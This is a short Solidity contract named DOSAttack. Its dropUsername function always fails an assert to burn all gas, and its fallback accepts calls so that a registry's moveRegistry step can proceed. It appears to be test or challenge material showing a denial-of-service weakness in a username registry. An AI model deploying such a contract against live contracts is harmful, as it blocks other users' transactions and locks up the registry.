pragma solidity ^0.4.24;

contract DOSAttack {

  function dropUsername(bytes32 _nothing) public {
    assert(1==2);  // consume all gas
    _nothing; // supress warning
}

  function () public {
    //do nothing. Required for moveRegistry()
  }
}
